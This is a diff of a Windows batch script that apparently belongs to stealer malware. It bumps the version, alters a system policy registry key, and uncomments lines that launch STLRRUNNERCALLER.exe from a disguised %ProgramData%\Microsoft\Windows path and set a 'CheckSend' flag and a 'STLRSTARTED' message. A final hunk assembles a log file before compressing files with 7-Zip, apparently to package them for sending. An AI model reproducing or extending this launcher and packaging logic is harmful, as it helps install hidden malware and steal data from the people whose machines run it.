@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=10.5"
+set "BATCHVERSION=10.7"
 
 
 
@@ -181,7 +181,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 echo Killing Tasks
-taskkill /F /IM STLRRUNNERCALLER.exe
+::taskkill /F /IM STLRRUNNERCALLER.exe
 echo.
 
 
@@ -195,11 +195,11 @@ goto :NEXT3
 tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
 if %errorlevel% neq 0 (
     echo STLRRUNNERCALLER.exe is not running.
-    ::set "CheckSend=1"
+    set "CheckSend=1"
     echo CheckSend=%CheckSend%
     echo Starting STLRRUNNERCALLER...
-    ::start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-    ::set "MESSAGE=STLRSTARTED|"
+    start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+    set "MESSAGE=STLRSTARTED|"
     echo Started.
 ) else (
     echo STLRRUNNERCALLER.exe is already running.
@@ -1701,6 +1701,8 @@ echo.
 
 del /f /q "%LOGSTLR%"
 type "%temp%\STLRLOG.mseuope" >> "%LOGSTLR%"
+echo. >> "%LOGSTLR%"
+echo. >> "%LOGSTLR%"
 echo 1 >> "%LOGSTLR%"
 
 rem Compress the files using 7-Zip
